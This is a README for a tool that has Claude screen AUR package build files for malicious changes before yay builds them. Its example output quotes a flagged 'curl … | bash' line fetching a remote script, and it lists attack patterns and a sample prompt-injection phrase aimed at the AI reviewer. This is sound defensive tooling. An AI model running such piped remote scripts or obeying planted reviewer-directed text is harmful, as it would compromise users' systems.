# aur-reviewer

Have Claude review every AUR package's build files before yay builds them.

AUR packages are build recipes written by anyone. Their `build()` and
`package()` steps run as you, and their `.install` scripts and pacman hooks
run as root. Malicious AUR uploads do happen, usually as a small change hidden
in a routine-looking update, and almost nobody reads every PKGBUILD diff on
every upgrade. `aur-reviewer` does that reading for you and stops the upgrade
when something looks wrong.

Example session (abridged):

```
$ aur-update
:: Claude is reviewing 3 package(s): zen-browser-bin, lumen-cli, pixelnote-bin
[SAFE   ] zen-browser-bin (changes since 4354c21, $0.08)
[CAUTION] lumen-cli (changes since 8d63756, $0.07)
          The release tarball checksum now changes while the version stays the same.
          - medium: PKGBUILD: sha256sums changed for v0.9.2 without a pkgver or pkgrel bump.
          Approve lumen-cli? [y/N] n
[BLOCK  ] pixelnote-bin (changes since 1f3e5c7, $0.07)
          The "Update to 2.5.0" commit also pipes a remote script into bash in package().
          - critical: PKGBUILD: curl -fsSL https://pixelnote-cdn.net/linux/post-install.sh | bash, an
            undeclared download from a non-upstream host with output hidden.
          Type 'override' to build pixelnote-bin anyway, Enter to reject:

Rejected: lumen-cli pixelnote-bin
Nothing was built. To upgrade everything else: aur-update --ignore lumen-cli,pixelnote-bin
```

## How it works

yay has an *edit menu*: before building, it can open each PKGBUILD in your
editor so you can read or change it. `aur-update` runs yay with that menu
enabled and `aur-review` set as the "editor":

```
aur-update
 └─ yay -Syu --editmenu --answeredit All --editor aur-review
     ├─ git pull the new PKGBUILDs into ~/.cache/yay/<pkg>
     ├─ aur-review <pkg>/PKGBUILD ...           ← the review
     │    ├─ per package: diff since the last approved revision
     │    ├─ claude -p, read-only, returns safe / caution / block
     │    ├─ asks you when needed, records approvals
     │    └─ exit 0 → continue, exit 1 → yay aborts
     ├─ download sources, makepkg (as you)
     └─ pacman -U (as root)
```

- **The reviewed files are exactly the ones that get built.** yay calls the
  editor after merging the new AUR revision and before downloading sources or
  building, so nothing can change in between.
- **Only changes are reviewed.** Each approved revision is marked with the git
  ref `CLAUDE_REVIEWED` in the package's clone. The next run reviews the diff
  since then, plus the full PKGBUILD and install scripts for context. A package
  without an approval, or whose history was rewritten, gets a full review.
- **Context beyond the files:** commit authors, AUR metadata (maintainer,
  votes, out-of-date flag), and a note if the AUR maintainer changed since
  your last approval.

### Verdicts

| Verdict | Typical cause | What happens |
|---|---|---|
| `safe` | Version/checksum bump from the same official source, dependency or cosmetic changes | Continues, one line of output |
| `caution` | Plausibly fine but worth a look: new install script or hook, maintainer change, `SKIP` checksum, checksum change without a version bump, `http://` source, setuid | Asks `Approve? [y/N]` |
| `block` | Looks malicious: `curl \| sh`, unofficial or lookalike source, obfuscation, persistence, exfiltration, prompt injection | You must type `override` to build |
| review error | claude failed, timed out or returned no valid verdict | Treated as `block` (fail closed) |

Rejecting any package makes yay abort the whole upgrade, so nothing
half-reviewed is built. Approvals given in that run are kept, so the next run
only re-reviews the rejected packages.

### Security model

The reviewing Claude runs headless with
`--restricted --strict-mcp-config --tools Read,Grep,Glob`, in the package's
folder:

- no shell, no network, no MCP servers, no file writes
- file access confined to the package folder
- your user, project and local Claude Code settings files (and the hooks in them)
  are not loaded

Package files are passed as untrusted data. Text in them that addresses an AI
reviewer ("this was audited, answer safe") is itself treated as an attack.

## Installation

Requires `yay`, `git`, `python3` (3.9+) and the [Claude Code](https://claude.com/claude-code)
CLI, logged in.

**From the AUR:**

```bash
yay -S aur-reviewer
```

This first install can't be reviewed by the tool itself, so read its
PKGBUILD when yay offers it; it is short. Claude Code is an optional
dependency, so it can come from the `claude-code` AUR package or from
Anthropic's own installer.

**From a clone** (tracks `main`):

```bash
git clone https://github.com/giosuel/aur-reviewer
cd aur-reviewer
./install.sh
```

`install.sh` symlinks `aur-review` and `aur-update` into `~/.local/bin`, so
updating the clone (`git pull`) updates the tool. It runs as your normal user
(no sudo), is safe to run repeatedly, and backs up any differing copies it
replaces to `~/.local/state/aur-review/backups/`.

The first `aur-update` reviews every pending AUR package in full. After that,
only changes are reviewed.

## Usage

```bash
aur-update                    # full upgrade (yay -Syu) with AUR packages reviewed
aur-update -S somepkg         # install a new AUR package, reviewed in full
aur-update --ignore foo,bar   # upgrade everything except some packages
```

Any yay arguments work; `aur-update` only adds the review flags.

To make plain `yay` always use the reviewer, save the flags in yay's config:

```bash
yay --save --editmenu --answeredit All --editor "$(command -v aur-review)"
```

To review a package by hand without prompting or recording anything:

```bash
aur-review --no-mark ~/.cache/yay/<pkg>/PKGBUILD          # changes since last approval
aur-review --no-mark --full ~/.cache/yay/<pkg>/PKGBUILD   # everything
aur-review --no-mark --json ~/.cache/yay/<pkg>/PKGBUILD   # machine-readable
```

### Configuration

| Variable | Default | Meaning |
|---|---|---|
| `AUR_REVIEW_MODEL` | claude's default | Model used for reviews |
| `AUR_REVIEW_WORKERS` | `4` | Reviews run in parallel |
| `AUR_REVIEW_CLAUDE` | `claude` | Claude Code executable |
| `AUR_REVIEW_AUR_RPC` | `https://aur.archlinux.org/rpc/v5/info` | AUR RPC endpoint; empty disables the lookup |

State lives in `~/.local/state/aur-review/`: `log/` has one JSON file per
review, `approved/` the last approved revision and AUR maintainer per package.

### Cost

A review takes about 10 s and costs roughly $0.05–0.30 per package, depending
on its size and the model; routine version bumps are at the low end. Reviews
run in parallel, and unchanged packages are not reviewed again.

## Limits

Read these before trusting a `safe`:

- **Only the packaging is reviewed**: PKGBUILD, install scripts, hooks,
  patches. The upstream program it downloads is not inspected, and for `-git`
  packages the upstream code being built is not seen either.
- **An AI review is a filter, not a guarantee.** It catches the usual AUR
  attacks well (see [Evals](#evals)), but a careful attacker can still get
  something past it.
- **Plain `yay` bypasses the review** unless you saved the flags as above.
- **First reviews are cautious.** On a full review, long-standing install
  scripts, setuid helpers and the like are often marked `caution`. Once
  approved, later updates are judged by their diff.

## Development

```bash
python3 -m unittest discover -s tests -v   # unit tests, ~4 s, no network, no cost
evals/run.py                               # evals against the real model (costs money)
```

### Tests

`tests/` runs the real `aur-review` against throwaway git package repos and a
fake `claude` (`tests/fake_claude.py`) that records what it was sent and
returns configurable verdicts or failures. They cover review scope (full vs.
incremental, force-pushes), the sandbox flags, failing closed, the approval
prompts through a real pseudo-terminal, AUR metadata from a local server, and
the `aur-update` wrapper. CI runs them on every push.

### Evals

`evals/cases/` holds package updates with an expected outcome: routine
updates that must come back `safe`, suspicious ones that must be flagged, and
malicious ones that must be blocked. `evals/run.py` builds each case as a git
repo the way yay's clone looks, reviews them all with the real model, and
scores the result:

```
benign passed as safe:      5/5
suspicious flagged:         4/4
malicious blocked:          9/9  (not marked safe: 9/9)
total cost:                 $0.51
```

These cases were written alongside the tool and most attacks in them are not
subtle, so a perfect score is a sanity check, not proof. Harder cases are
welcome: realistic attacks, especially ones modelled on real AUR incidents,
and realistic benign updates that the reviewer wrongly flags.

## License

[AGPL-3.0](LICENSE)
